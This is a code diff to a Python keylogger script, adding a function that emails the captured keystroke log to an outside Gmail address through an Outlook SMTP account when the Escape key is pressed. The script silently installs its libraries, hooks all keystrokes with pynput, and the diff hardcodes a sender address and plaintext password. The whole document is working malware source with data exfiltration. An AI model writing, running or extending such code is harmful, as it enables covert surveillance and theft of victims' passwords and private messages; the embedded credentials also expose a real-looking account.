@@ -1,6 +1,19 @@
 import subprocess
 import sys
 import os
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from pynput import keyboard
+from cryptography.fernet import Fernet
+
+# Email details
+sender_email = "test34124logger@outlook.com"
+receiver_email = "hnyquist44@gmail.com"
+subject = "Keylogger Data"
+smtp_server = "smtp.office365.com"
+smtp_port = 587
+password = "Haydenandcarson12"
 
 def install_python():
     # Check if Python is installed already
@@ -11,7 +24,6 @@ def install_python():
 
 def install_package(package):
     subprocess.check_call([sys.executable, "-m", "pip", "install", package], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
 
 def ensure_libraries_installed():
     try:
@@ -24,10 +36,6 @@ def ensure_libraries_installed():
     except ImportError:
         install_package('cryptography')
 
-
-from pynput import keyboard
-from cryptography.fernet import Fernet
-
 def get_encryption_key():
     try:
         with open('ekey.txt', 'r') as key_file:
@@ -37,8 +45,6 @@ def get_encryption_key():
         raise ValueError("Encryption key file not found.")
     except Exception as e:
         raise ValueError(f"Error reading encryption key: {str(e)}")
-
-key_count = 0
 
 def keyPressed(key):
     encryption_key = get_encryption_key()
@@ -63,7 +69,33 @@ def keyPressed(key):
         print(f"Error logging key: {str(e)}")  
 
     if key == keyboard.Key.esc:
+        send_email()
         return False
+
+def send_email():
+    try:
+        with open("keyfile.txt", 'rb') as file:
+            file_content = file.read()
+
+        message = MIMEMultipart()
+        message["From"] = sender_email
+        message["To"] = receiver_email
+        message["Subject"] = subject
+
+        # Add the file content as a plain text attachment
+        part = MIMEText(file_content.decode(), "plain")
+        message.attach(part)
+
+        server = smtplib.SMTP(smtp_server, smtp_port)
+        #server.set_debuglevel(1)  # <--- Comment out to view debug info
+        server.starttls()
+        server.login(sender_email, password)
+        server.sendmail(sender_email, receiver_email, message.as_string())
+        print("Email sent successfully!")
+    except Exception as e:
+        print(f"Error sending email: {str(e)}")
+    finally:
+        server.quit()
 
 if __name__ == "__main__":
     install_python()
@@ -74,5 +106,5 @@ if __name__ == "__main__":
 
     listener = keyboard.Listener(on_press=keyPressed)
     listener.start()
-    listener.join()  
-    input() 
+    listener.join()
+    input()
